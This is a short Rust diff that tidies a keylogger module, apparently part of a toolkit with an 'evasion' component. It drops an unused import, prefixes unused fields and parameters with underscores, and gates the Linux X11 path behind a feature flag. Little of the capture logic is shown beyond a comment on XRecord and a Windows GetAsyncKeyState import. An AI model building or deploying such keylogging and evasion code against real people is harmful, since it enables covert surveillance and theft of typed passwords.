@@ -12,7 +12,7 @@
 
 use std::collections::VecDeque;
 use std::sync::{Arc, Mutex};
-use std::time::{Duration, SystemTime, UNIX_EPOCH};
+use std::time::{SystemTime, UNIX_EPOCH};
 
 use crate::module::evasion::errors::EvasionError;
 
@@ -214,7 +214,7 @@ impl KeyloggerState {
 
 /// Keylogger module
 pub struct KeyloggerModule {
-    config: KeyloggerConfig,
+    _config: KeyloggerConfig,
     state: Arc<Mutex<KeyloggerState>>,
 }
 
@@ -228,7 +228,7 @@ impl KeyloggerModule {
     pub fn with_config(config: KeyloggerConfig) -> Self {
         let buffer_size = config.buffer_size;
         Self {
-            config,
+            _config: config,
             state: Arc::new(Mutex::new(KeyloggerState::new(buffer_size))),
         }
     }
@@ -366,6 +366,7 @@ impl KeyloggerModule {
     }
 
     #[cfg(target_os = "linux")]
+    #[cfg(feature = "x11")]
     fn start_x11(&self) -> Result<(), EvasionError> {
         // X11 keylogging would use XRecord extension
         // This requires the x11rb or x11 crate
@@ -483,7 +484,7 @@ impl Default for KeyloggerModule {
 }
 
 /// Convenience function for quick key state check
-pub fn get_key_state(virtual_key: u8) -> bool {
+pub fn get_key_state(_virtual_key: u8) -> bool {
     #[cfg(target_os = "windows")]
     {
         use winapi::um::winuser::GetAsyncKeyState;
